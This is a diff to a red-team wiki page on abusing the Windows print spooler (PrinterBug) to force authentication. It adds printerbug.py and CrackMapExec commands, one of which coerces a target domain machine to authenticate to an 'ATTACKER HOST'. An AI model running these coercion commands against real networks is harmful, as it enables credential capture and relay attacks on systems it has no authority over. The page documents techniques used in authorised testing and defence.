@@ -20,7 +20,7 @@ The spooler service can be triggered with [printerbug](https://github.com/dirkja
 
 {% tabs %}
 {% tab title="printerbug" %}
-Trigger the spooler service
+Using [printerbug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) (python) Trigger the spooler service
 
 ```bash
 printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST'
@@ -35,10 +35,19 @@ rpcdump.py $TARGET | grep -A 6 "spoolsv"
 ```
 {% endtab %}
 
-{% tab title="SpoolerScanner" %}
-Check if the spooler service is available
+{% tab title="CrackMapExec" %}
+[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python) can be used to check if the spooler service is running.
 
+```bash
+crackmapexec smb $IP -u $USER -p $PASSWORD -M spooler
 ```
+{% endtab %}
+
+{% tab title="SpoolerScanner" %}
+Check if the spooler service is available (Windows) using  [SpoolerScanner](https://github.com/vletoux/SpoolerScanner) (Powershell)
+
+```powershell
+.\SpoolerScan.ps1
 ```
 {% endtab %}
 
@@ -59,4 +68,3 @@ proxychains printerbug.py -no-pass 'DOMAIN'/'USER'@'TARGET' 'ATTACKER HOST'
 ## Resources
 
 {% embed url="https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/" %}
-
